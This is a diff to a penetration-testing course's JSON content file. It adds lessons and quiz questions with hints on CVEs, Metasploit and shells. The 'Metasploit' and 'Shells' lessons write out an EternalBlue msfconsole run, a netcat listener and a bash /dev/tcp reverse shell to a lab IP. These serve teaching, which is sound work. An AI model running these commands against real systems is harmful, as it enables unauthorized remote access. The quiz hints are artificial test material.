@@ -4,43 +4,67 @@
   "tasks": {
     "1": {
       "title": "Vulnerabilities and CVEs",
+      "body": "## The language of vulnerabilities\n\n- **Vulnerability**: the flaw (an unbounded buffer, a missing validation).\n- **CVE-2021-44228**: a unique identifier (that one is Log4Shell, write it down).\n- **CVSS**: a score from 0 to 10 — 9.8 = \"patch NOW\"; 3.1 = \"when you can\".\n- **Exploit**: whatever ABUSES the flaw (a script, a chain of actions, a tool).\n- **0-day**: a vulnerability with no known patch — the most valuable (and dangerous) ones.\n\n## Your real workflow\n\nYou enumerated an FTP `vsftpd 2.3.4` on port 21. What do you do?\n\n1. `searchsploit vsftpd 2.3.4` — searches **Exploit-DB** (the most classic public\n   exploit database; `searchsploit` is its local client).\n2. Browser: NVD (nvd.nist.gov) or cve.mitre.org for the CVE details.\n3. Is there a public exploit? Download it (`searchsploit -m 49757.py`), READ IT ALL,\n   adapt the IPs/ports, and run it in your lab.\n\n```bash\nsearchsploit apache 2.4.49    # the classic path traversal\nsearchsploit -x 50383.py      # examine an exploit\n```\n\nGolden rule: **never run an exploit you don't understand** — in a lab it blows up\nin your face; in a real engagement, it can take production down.",
       "questions": {
         "explotacion-basica-t01-q01": {
-          "prompt": "What is the standard public vulnerability identifier?"
+          "prompt": "What is the standard public identifier of a vulnerability (YEAR-number format) called?",
+          "hint": "Common Vulnerabilities and Exposures."
         },
         "explotacion-basica-t01-q02": {
-          "prompt": "What is an exploit?"
+          "prompt": "What is an exploit?",
+          "hint": "It isn't the vulnerability itself.",
+          "options": {
+            "a": "The software vulnerability",
+            "b": "The code or technique that ABUSES a vulnerability to achieve something",
+            "c": "The patch that fixes it",
+            "d": "A type of firewall"
+          }
         },
         "explotacion-basica-t01-q03": {
-          "prompt": "What scores vulnerability severity 0-10?"
+          "prompt": "What scores the severity of a vulnerability from 0 to 10?",
+          "hint": "Common Vulnerability Scoring System."
         }
       }
     },
     "2": {
       "title": "Metasploit",
+      "body": "## msfconsole in five commands\n\nMetasploit does NOT do magic: it's a framework that ORGANIZES public exploits and payloads\n(more than 2000 modules) behind a common interface.\n\n```text\nmsf6> search eternalblue            # search by name/CVE\nmsf6> use exploit/windows/smb/ms17_010_eternalblue\nmsf6> show options                   # what do I still need to configure?\nmsf6> set RHOSTS 10.10.10.40        # the target\nmsf6> set LHOST 10.10.14.5          # MY ip (for the reverse shell)\nmsf6> run\n```\n\n## Payloads: bind vs reverse\n\n- **Bind**: the victim opens a port and waits for you to connect (`nc victima 4444`).\n- **Reverse**: THE VICTIM calls you (ideal against firewalls that filter\n  inbound traffic). `windows/x64/meterpreter/reverse_tcp` is the classic.\n\n**Meterpreter** is the star payload: an in-memory shell, process migration,\nkeylogger, file download… and a minimal footprint.\n\n## Honest context\n\nIn CTFs and while learning, Metasploit speeds things up enormously. In real pentests many\nteams avoid it in sensitive phases (it's noisy and detected by EDRs) and prefer\nmanual exploits. You'll master both: here we use it to UNDERSTAND the\nexploitation→payload→session flow, which is identical when done by hand.",
       "questions": {
         "explotacion-basica-t02-q01": {
-          "prompt": "What command selects a module?"
+          "prompt": "Which msfconsole command SELECTS the module you are going to use?",
+          "hint": "Three letters: use exploit/..."
         },
         "explotacion-basica-t02-q02": {
-          "prompt": "What command lists options?"
+          "prompt": "Which Metasploit command lists the module's configurable parameters?",
+          "hint": "Two words: 'show' + what you want to see."
         },
         "explotacion-basica-t02-q03": {
-          "prompt": "What is a payload?"
+          "prompt": "What is a payload in Metasploit?",
+          "hint": "What you leave INSIDE after exploiting.",
+          "options": {
+            "a": "The port scanner",
+            "b": "The code that runs on the victim after exploitation (e.g. a shell)",
+            "c": "The pentest report",
+            "d": "A browser plugin"
+          }
         }
       }
     },
     "3": {
       "title": "Shells",
+      "body": "## Your first shell\n\nA **shell** is code running on the victim that gives you a command line.\nThe classic way to catch it:\n\n```bash\n# On YOUR machine (the \"listener\"):\nnc -lvnp 4444\n```\n\nAnd on the victim you trigger (via RCE, upload, etc.) something like:\n\n```bash\nbash -i >& /dev/tcp/10.10.14.5/4444 0>&1      # bash reverse shell\n```\n\nA cheat sheet of one-liners per language (bash/php/python/perl/powershell):\n**revshells.com** — the generator everyone keeps open in a tab.\n\n## Upgrading the shell (your first rite of passage)\n\n```bash\npython3 -c 'import pty; pty.spawn(\"/bin/bash\")'   # pseudo-terminal\nexport TERM=xterm                                  # colors and clear\n# Ctrl+Z, then in your terminal:\nstty raw -echo; fg\nstty rows 40 cols 120\n```\n\nWith this you get arrow keys, history, TAB and a Ctrl+C that doesn't kill the session. In labs\nyou'll do it so many times that it'll become second nature.\n\n## And now, escalate\n\nThe initial shell is usually a limited user (www-data, service). Privilege escalation\n(local) is covered in depth in the Jr Penetration Tester path — and what\nyou already sense about Linux (SUID, sudo -l, cron) and Windows (UAC, services) will apply directly.",
       "questions": {
         "explotacion-basica-t03-q01": {
-          "prompt": "What program receives a reverse shell on port 4444?"
+          "prompt": "Which program do you use on your machine to RECEIVE a reverse shell on port 4444?",
+          "hint": "The networking 'Swiss Army knife'; it listens with -lvnp."
         },
         "explotacion-basica-t03-q02": {
-          "prompt": "Why does reverse work better than bind against firewalls?"
+          "prompt": "A reverse shell usually works better than a bind shell on firewalled networks because firewalls mostly filter… incoming or outgoing connections?",
+          "hint": "In a reverse shell, it's the victim who opens the connection to you."
         },
         "explotacion-basica-t03-q03": {
-          "prompt": "What command makes a basic shell interactive?"
+          "prompt": "With a basic shell, which command turns it into a fully interactive one (with history and a Ctrl+C that doesn't kill it)?",
+          "hint": "The trio: python -c 'import pty'... + export TERM=xterm"
         }
       }
     }
